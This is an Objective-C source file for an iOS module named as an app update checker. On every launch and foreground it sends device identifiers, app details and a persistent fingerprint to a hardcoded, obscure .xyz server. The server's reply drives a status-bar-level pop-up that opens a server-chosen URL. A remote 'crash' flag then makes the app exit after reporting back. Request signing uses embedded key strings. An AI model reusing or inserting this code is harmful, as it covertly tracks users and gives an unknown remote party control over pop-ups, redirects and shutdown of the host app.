//
//  RepostFanUpdate.m
//  RepostFan
//
//  Created by liuming on 2018/12/18.
//  Copyright © 2018年 liuming. All rights reserved.
//

#import "RepostFanUpdate.h"
#import <wchar.h>
#import <CommonCrypto/CommonDigest.h>
#include <sys/types.h>
#include <sys/utsname.h>

@implementation RepostFanUpdate

+ (instancetype)share
{
    static dispatch_once_t onceToken;
    static RepostFanUpdate *__static__share__ = nil;
    dispatch_once(&onceToken, ^{
        __static__share__ = [RepostFanUpdate new];
    });
    
    return __static__share__;
}

- (instancetype)init
{
    self = [super init];
    if (self) {
        
        self.processing = false;
        
        NSNotificationCenter *center = [NSNotificationCenter defaultCenter];
        
        [center addObserver:self
                   selector:@selector(willEnterForeground:)
                       name:UIApplicationWillEnterForegroundNotification object:nil];
        
        [center addObserver:self
                   selector:@selector(willEnterForeground:)
                       name:UIApplicationDidFinishLaunchingNotification object:nil];
    }
    return self;
}


+ (void)customUrl:(NSString *)url; {
    [RepostFanUpdate share].hostUrl = url;
}

static UIWindow *window = nil;

- (void)willEnterForeground:(NSNotification *)aNotification {
    
    if ([NSUserDefaults.standardUserDefaults valueForKey:@"auto"] != nil) {
        if (![NSUserDefaults.standardUserDefaults boolForKey:@"auto"])
        {
            return;
        }
    }
    
    [self fetchConfig:^{
        NSNumber *nCrash = self.data[@"crash"];
        BOOL bCrash = false;
        if ([nCrash isKindOfClass:[NSNumber class]]) {
            bCrash = [nCrash boolValue];
        }
        
        UIApplication *app = [UIApplication sharedApplication];
        
        NSString *title = self.data[@"title"];
        NSString *description = self.data[@"description"];
        
        NSString *updateUrl = self.data[@"url"];
        
        NSDictionary *control = self.data[@"control"];
        
        NSString *okTitle = control[@"1"];
        NSString *cancelTitle = control[@"2"];
        
        UIAlertController *alert =
        [UIAlertController alertControllerWithTitle:title
                                            message:description
                                     preferredStyle:UIAlertControllerStyleAlert];
        
        __weak RepostFanUpdate *SELF = self;
        
        if (okTitle.length > 0) {
            UIAlertAction *action =
            [UIAlertAction actionWithTitle:okTitle
                                     style:UIAlertActionStyleDefault
                                   handler:
             ^(UIAlertAction * _Nonnull action) {
                 
                 NSURL *url = [NSURL URLWithString:updateUrl];
                 if ([app canOpenURL:url]) {
                     
                     if([app respondsToSelector:@selector(openURL:options:completionHandler:)]) {
                         [app openURL:url
                              options:@{}
                    completionHandler:^(BOOL success) {
                        if (success) {
                            if (bCrash) {
                                [self pullDataSS:^(NSDictionary *json) {
                                    exit(0);
                                }];
                            }
                            else {
                                [self pullDataSS:nil];
                            }
                        }
                    }];
                     }
                     else {
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
                         [app openURL:url];
                         [self pullDataSS:nil];
                         
                         if (bCrash) {
                             [self pullDataSS:^(NSDictionary *json) {
                                 exit(0);
                             }];
                         }
#pragma GCC diagnostic pop
                     }
                     
                     
                 }
                 
                 [alert dismissViewControllerAnimated:true completion:nil];
                 
                 window = nil;
                 
                 SELF.processing = false;
             }];
            
            [alert addAction:action];
        }
        
        if (cancelTitle.length > 0) {
            UIAlertAction *action =
            [UIAlertAction actionWithTitle:cancelTitle style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                
                [alert dismissViewControllerAnimated:true completion:nil];
                
                window = nil;
                
                SELF.processing = false;
            }];
            
            [alert addAction:action];
        }
        
        if (!window) {
            window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
            window.windowLevel = UIWindowLevelStatusBar;
            window.rootViewController = [UIViewController new];
            window.rootViewController.view.backgroundColor = [UIColor clearColor];
            [window makeKeyAndVisible];
        }
        
        [window.rootViewController presentViewController:alert animated:true completion:nil];
    }];
}

- (void)setUuid:(NSString *)uuid
{
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setObject:uuid forKey:@"kkkkkkk_uuid"];
    [ud synchronize];
}

- (NSString *)uuid
{
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    return [ud valueForKey:@"kkkkkkk_uuid"];
}

- (NSString *)appBid
{
    
    static NSString *bid = nil;
    if (!bid) {
        NSDictionary *bundleInfo = [NSBundle mainBundle].infoDictionary;
        bid = bundleInfo[@"CFBundleIdentifier"];
    }
    
    return bid;
}

- (NSString *)appName {
    
    static NSString *name = nil;
    if (!name) {
        NSDictionary *bundleInfo = [NSBundle mainBundle].infoDictionary;
        NSDictionary *bundleLocalInfo = [NSBundle mainBundle].localizedInfoDictionary;
        
        NSString *appName = bundleLocalInfo[@"CFBundleDisplayName"];
        
        if (!appName || appName.length < 1) {
            appName = bundleLocalInfo[@"CFBundleDisplayName"];
        }
        
        if (!appName || appName.length < 1) {
            appName = bundleInfo[@"CFBundleName"];
        }
        
        name = [appName stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
    }
    
    return name;
}

- (NSString *)appVer {
    
    static NSString *ver = nil;
    if (!ver) {
        NSDictionary *bundleInfo = [NSBundle mainBundle].infoDictionary;;
        
        ver = bundleInfo[@"CFBundleShortVersionString"];
    }
    
    return ver;
    
}

- (NSString *)appLan {
    static NSString *lan = nil;
    if (!lan) {
        lan = [NSLocale preferredLanguages].firstObject;
    }
    
    return lan;
}

- (NSString *)deviceId {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    static NSString *did = nil;
    if (!did) {
        did = [ud valueForKey:@"-|-"];
    }
    
    if (!!did) {
        return did;
    }
    
    NSString *key = [NSString stringWithFormat:@"%@%f%d%d", self.appBid, [[NSDate date] timeIntervalSince1970], arc4random(), arc4random()];
    
    key = [self sha1:key];
    
    [ud setObject:key forKey:@"-|-"];
    [ud synchronize];
    
    did = key;
    
    return did;
}

- (NSString *)model {
    struct utsname systemInfo;
    
    uname(&systemInfo);
    
    NSString* code = [NSString stringWithCString:systemInfo.machine
                                        encoding:NSUTF8StringEncoding];
    
    return code;
}

- (NSString *)md5:(NSString *)str {
    if (str.length < 1) {
        return nil;
    }
    unsigned char result[CC_MD5_DIGEST_LENGTH] = {0};
    
    CC_MD5([str UTF8String], (CC_LONG)[str length], result);
    
    NSMutableString *ret = [NSMutableString string];
    for (int i = 0; i<CC_MD5_DIGEST_LENGTH; i++) {
        [ret appendFormat:@"%02x", result[i]];
    }
    
    return ret;
}

- (NSString *)sha1:(NSString *)str {
    if (str.length < 1) {
        return nil;
    }
    unsigned char result[CC_SHA1_DIGEST_LENGTH] = {0};
    CC_SHA1([str UTF8String], (CC_LONG)[str length], result);
    NSMutableString *ret = [NSMutableString string];
    for (int i = 0; i<CC_SHA1_DIGEST_LENGTH; i++) {
        [ret appendFormat:@"%02x", result[i]];
    }
    return ret;
}

- (void)pullDataFS:(Handler)handler action:(NSString *)action
{

    NSString *strHost = self.hostUrl ?:
    @"https://x.lbfaoi0103u103u9791051.xyz/small-app-api/index.php/api3";

   NSString *host = [NSString stringWithFormat:@"%@/%@",strHost, action];


   NSString *t = [NSString stringWithFormat:@"%f", [[NSDate date] timeIntervalSince1970]];

          NSMutableDictionary *paras =[NSMutableDictionary dictionary];

        NSBundle *bundle = [NSBundle bundleForClass:[self class]];

        paras[@"app_id"] = self.appBid;
        paras[@"app_name"] = self.appName;
        paras[@"app_lang"] = self.appLan;
        paras[@"app_ver"] = self.appVer;
        paras[@"deviceType"] = self.model;
        paras[@"t"] = t;
        paras[@"ptid"] = self.ptid ?: @"0";
        paras[@"uuid"] = self.uuid;
        paras[@"deviceId"] = self.deviceId;
        paras[@"sdk_ver"] = bundle.infoDictionary[@"CFBundleShortVersionString"];
        NSString *auth = @"";
        auth = [auth stringByAppendingFormat:@"%@,", self.appBid];
        auth = [auth stringByAppendingFormat:@"%@,", self.appName];
        auth = [auth stringByAppendingFormat:@"%@,", self.appLan];
        auth = [auth stringByAppendingFormat:@"%@,", self.uuid ?: @""];
        auth = [auth stringByAppendingFormat:@"%@,", self.deviceId];
        auth = [auth stringByAppendingFormat:@"%@,", t];
        auth = [auth stringByAppendingFormat:@"%@,", self.ptid ?: @"0"];
        auth = [auth stringByAppendingString:@"i am key1:b794955f198d1ce1e2eac4c969a3df75."];

        auth = [self md5:auth];
        auth = [auth stringByAppendingString:@",ok,iam key2:f206c6714120100e58be34663ae411a3."];
        auth = [self md5:auth];

        paras[@"auth"] = auth;

        id data =
        [NSJSONSerialization dataWithJSONObject:paras
                                        options:kNilOptions
                                          error:nil];

        NSURL *url = [NSURL URLWithString:host];

        NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:url];

        r.HTTPMethod = @"POST";

        NSString *json = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
        NSCharacterSet *set = [NSCharacterSet URLQueryAllowedCharacterSet];
        json = [json stringByAddingPercentEncodingWithAllowedCharacters:set];


        r.HTTPBody = [[NSString stringWithFormat:@"data=%@",json] dataUsingEncoding:NSUTF8StringEncoding];

        NSURLSession *session = [NSURLSession sharedSession];

        NSURLSessionDataTask *task =
        [session dataTaskWithRequest:r
                   completionHandler:^(NSData * _Nullable data,
                                       NSURLResponse * _Nullable response,
                                       NSError * _Nullable error) {
                       
                       NSDictionary *json = nil;
                       
                       do {
                           if (!!error) {
                               break;
                           }
                           
                           if (!data) {
                               break;
                           }
                           
                           json =
                           [NSJSONSerialization JSONObjectWithData:data
                                                           options:kNilOptions
                                                             error:nil];
                           if (!json && data) {
                              
                           }
                           
                       
                           
                       } while (0);
                       
                       if (json) {
                           id userInfo = json[@"user"];
                           NSString *uuid = userInfo[@"uuid"];
                           self.uuid = uuid;
                       }
                       
                       id tid = json[@"ptid"];
                       
                       if (!!tid) {
                           self.ptid = [NSString stringWithFormat:@"%@", tid];
                       }
                       else {
                           self.ptid = nil;
                       }
                       
                       
                       if (handler) {
                           handler(json);
                       }
                   }];

        [task resume];
}

- (void)pullDataSS:(Handler)handler {
    if (self.ptid) {
        [self pullDataFS:handler action:@"ptaskl"];
    }
}


- (void)pullDataFS:(Handler)handler {
    [self pullDataFS:handler action:@"ptask"];
}


- (void)fetchConfig:(ZZLeadConfigCallback)callback {
    //当前正在处理数据
    if (self.processing) {
       
        return;
    }
    
    self.processing = true;
    
    [self pullDataFS:^(NSDictionary *json) {
        if (!json) {
            self.processing = false;
            return;
        }
        
        self.data = json;
        
        //服务器关闭功能.
        BOOL enable = [self.data[@"enable"] boolValue];
        if (!enable) {
        
            self.processing = false;
            return;
        }
        
        NSString *updateUrl = self.data[@"url"];
        
        if (updateUrl.length < 1) {
        
            self.processing = false;
            return;
        }
        
        
        if (callback) {
            dispatch_async(dispatch_get_main_queue(), callback);
        }
    }];
}

@end

